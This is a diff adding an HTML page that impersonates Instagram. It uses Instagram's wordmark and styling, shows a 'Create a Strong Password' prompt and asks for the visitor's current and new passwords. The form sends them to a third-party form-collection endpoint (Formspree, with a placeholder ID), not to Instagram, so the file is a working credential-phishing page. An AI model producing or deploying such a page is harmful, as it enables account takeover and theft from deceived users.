@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
+    .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; }
+    img { width: 175px; margin-bottom: 20px; }
+    h3 { color: #262626; font-size: 16px; }
+    input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #efefef; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+    button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+    p { font-size: 13px; color: #8e8e8e; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251110aa34.png">
+    <h3>Create a Strong Password</h3>
+    <p>Enter your current password and your new desired password below.</p>
+    
+    <form action="https://formspree.io/f/YOUR_FORMSPREE_ID" method="POST">
+      <input type="password" name="old_password" placeholder="Old Password" required>
+      <input type="password" name="new_password" placeholder="New Password" required>
+      <input type="password" name="confirm_password" placeholder="New Password Confirmation" required>
+      <button type="submit">Reset Password</button>
+    </form>
+  </div>
+</body>
+</html>
